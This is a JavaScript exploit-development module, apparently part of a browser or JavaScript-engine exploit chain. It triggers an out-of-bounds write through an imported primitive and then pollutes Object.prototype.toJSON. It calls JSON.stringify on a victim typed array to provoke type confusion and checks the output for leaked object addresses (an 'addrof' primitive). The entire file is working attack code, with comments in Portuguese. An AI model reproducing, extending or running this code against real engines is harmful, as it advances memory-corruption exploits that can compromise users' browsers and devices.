// js/script3/testArrayBufferVictimCrash.mjs (v37_LeakObjectsViaConfusedDetailsObject)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO = "OriginalHeisenbug_TypedArrayAddrof_v37_LeakObjectsViaConfusedDetailsObject";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v37 = null;
let object_to_leak_B_v37 = null;
let victim_typed_array_ref_v37 = null; 
let probe_call_count_v37 = 0;
let all_probe_interaction_details_v37 = []; 
let first_call_details_object_ref_v37 = null; 

const PROBE_CALL_LIMIT_V37 = 5; 

function toJSON_TA_Probe_LeakObjectsViaC1() {
    probe_call_count_v37++;
    const call_num = probe_call_count_v37;
    let current_call_details = { // Sempre criar um novo objeto de detalhes para esta chamada
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v37_LeakObjectsViaC1",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v37),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v37 && first_call_details_object_ref_v37 !== null),
        payload_A_assigned_to_C1_this: false, 
        payload_B_assigned_to_C1_this: false,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1DetailsObj? ${current_call_details.this_is_C1_details_obj}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V37) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v37.push(current_call_details);
            return { recursion_stopped_v37: true, call: call_num };
        }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating and returning C1_details object.`, "info");
            // C1_details é este current_call_details. Ele será retornado.
            first_call_details_object_ref_v37 = current_call_details; // Global aponta para C1_details
            all_probe_interaction_details_v37.push(current_call_details);
            return current_call_details; 
        } else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') { 
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS_OBJECT ('this')! Attempting to assign leaky objects...`, "vuln");
            
            if (object_to_leak_A_v37) this.payload_A = object_to_leak_A_v37;
            if (object_to_leak_B_v37) this.payload_B = object_to_leak_B_v37;
            
            // Atualizar o current_call_details desta chamada para refletir o que aconteceu com 'this' (C1_details)
            current_call_details.payload_A_assigned_to_C1_this = true; // Não podemos ler this.payload_A aqui para current_call_details se causar ciclo
            current_call_details.payload_B_assigned_to_C1_this = true;
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Objects assigned to 'this' (C1_details). Keys: ${Object.keys(this).join(',')}`, "info");
            
            all_probe_interaction_details_v37.push(current_call_details); // Adiciona C2/C3 etc. details
            return this; // Retornar o 'this' modificado (C1_details modificado)
        } else {
            // Outras chamadas, ou 'this' não é o esperado nem confuso como esperado.
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected or not confused as C1_details. Type: ${current_call_details.this_type}`, "warn");
            all_probe_interaction_details_v37.push(current_call_details);
            // Retornar um novo marcador para evitar que 'this' (se for um objeto interno) seja modificado e retornado.
            return { generic_marker_v37: call_num }; 
        }

    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
        all_probe_interaction_details_v37.push(current_call_details); // Adiciona mesmo com erro
        return { error_marker_v37: call_num }; // Retorno em caso de erro
    }
}

export async function executeTypedArrayVictimAddrofTest_LeakObjectsViaConfusedDetailsObject() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (LeakObjectsViaConfusedDetailsObject) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO} Init...`;

    probe_call_count_v37 = 0;
    all_probe_interaction_details_v37 = []; 
    victim_typed_array_ref_v37 = null; 
    first_call_details_object_ref_v37 = null;
    object_to_leak_A_v37 = { marker_A_v37: "LeakMeA_LOVCDO", idA: Date.now() }; 
    object_to_leak_B_v37 = { marker_B_v37: "LeakMeB_LOVCDO", idB: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    let details_of_C1_call_after_modification = null; 
    
    let addrof_A = { success: false, msg: "Addrof A from Output.payload_A: Default" };
    let addrof_B = { success: false, msg: "Addrof B from Output.payload_B: Default" };
    const fillPattern = 0.37373737373737;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v37 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v37.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v37 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_LeakObjectsViaC1, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v37); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                // stringifyOutput_parsed será o C1_details modificado, serializado.
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Output was: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }
            
            // first_call_details_object_ref_v37 é a REFERÊNCIA ao objeto C1_details.
            // Se ele foi modificado nas chamadas subsequentes, essas modificações estarão aqui.
            if (first_call_details_object_ref_v37) {
                details_of_C1_call_after_modification = JSON.parse(JSON.stringify(first_call_details_object_ref_v37)); 
            }
            logS3(`  EXECUTE: Captured state of C1_details object AFTER all probe calls: ${details_of_C1_call_after_modification ? JSON.stringify(details_of_C1_call_after_modification) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnC1 = false;
            // A confirmação da Heisenbug agora é se o C1 (stringifyOutput_parsed) contém os payloads
            if (stringifyOutput_parsed && stringifyOutput_parsed.marker_id_v27 === "MARKER_P1_V27_PAYLOAD" &&
                (stringifyOutput_parsed.hasOwnProperty('payload_A') || stringifyOutput_parsed.hasOwnProperty('payload_B')) ) {
                 // E se alguma das chamadas da sonda (exceto a primeira) viu 'this' como '[object Object]'
                for(let i=1; i < all_probe_interaction_details_v37.length; i++) {
                    if (all_probe_interaction_details_v37[i].this_type === '[object Object]' && 
                        all_probe_interaction_details_v37[i].this_is_C1_details_obj) {
                        heisenbugOnC1 = true;
                        break;
                    }
                }
            }

            if(heisenbugOnC1){
                logS3(`  EXECUTE: HEISENBUG & WRITES on C1_details CONFIRMED!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug/Writes on C1_details NOT confirmed as expected.`, "error", FNAME_CURRENT_TEST);
            }
                
            logS3("STEP 3: Checking stringifyOutput_parsed (the C1_details object) for leaked payloads...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.marker_id_v27 === "MARKER_P1_V27_PAYLOAD") {
                const payload_A_val = stringifyOutput_parsed.payload_A;
                if (typeof payload_A_val === 'number' && payload_A_val !==0) {
                    let pA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_A_val]).buffer)[0], new Uint32Array(new Float64Array([payload_A_val]).buffer)[1]);
                    if (pA_int64.high() < 0x00020000 || (pA_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_A.success = true; addrof_A.msg = `Possible pointer for payload_A in C1_details (stringifyOutput): ${pA_int64.toString(true)}`;
                    } else { addrof_A.msg = `C1.payload_A is num but not ptr: ${payload_A_val}`; }
                } else if (payload_A_val && payload_A_val.marker_A_v37 === object_to_leak_A_v37.marker_A_v37) {
                     addrof_A.success = true; addrof_A.msg = "object_to_leak_A_v37 identity in C1.payload_A.";
                } else { addrof_A.msg = `C1.payload_A not ptr or not expected object. Val: ${JSON.stringify(payload_A_val)}`; }

                const payload_B_val = stringifyOutput_parsed.payload_B;
                 if (typeof payload_B_val === 'number' && payload_B_val !==0) {
                    let pB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_B_val]).buffer)[0], new Uint32Array(new Float64Array([payload_B_val]).buffer)[1]);
                    if (pB_int64.high() < 0x00020000 || (pB_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_B.success = true; addrof_B.msg = `Possible pointer for payload_B in C1_details (stringifyOutput): ${pB_int64.toString(true)}`;
                    } else { addrof_B.msg = `C1.payload_B is num but not ptr: ${payload_B_val}`; }
                } else if (payload_B_val && payload_B_val.marker_B_v37 === object_to_leak_B_v37.marker_B_v37) {
                     addrof_B.success = true; addrof_B.msg = "object_to_leak_B_v37 identity in C1.payload_B.";
                } else { addrof_B.msg = `C1.payload_B not ptr or not expected object. Val: ${JSON.stringify(payload_B_val)}`; }
            } else {
                 addrof_A.msg = "stringifyOutput was not the expected C1_details object or was null/error.";
                 addrof_B.msg = "stringifyOutput was not the expected C1_details object or was null/error.";
                 logS3(`  stringifyOutput_parsed type: ${typeof stringifyOutput_parsed}, content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn");
            }

            if (addrof_A.success || addrof_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: AddrInC1 SUCCESS!`;
            } else if (heisenbugOnC1) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: C1_TC OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: No C1_TC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v37}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A (C1.payload_A): Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B (C1.payload_B): Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v37 = null; 
        all_probe_interaction_details_v37 = []; 
        probe_call_count_v37 = 0;
        first_call_details_object_ref_v37 = null;
    }
    return { 
        errorCapturedMain: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput_parsed, 
        // Retorna o snapshot do objeto C1 após todas as modificações, se ele existir
        toJSON_details: first_call_details_object_ref_v37 ? JSON.parse(JSON.stringify(first_call_details_object_ref_v37)) : null, 
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v37],
        total_probe_calls: probe_call_count_v37,
        addrof_A_result: addrof_A,
        addrof_B_result: addrof_B
    };
}
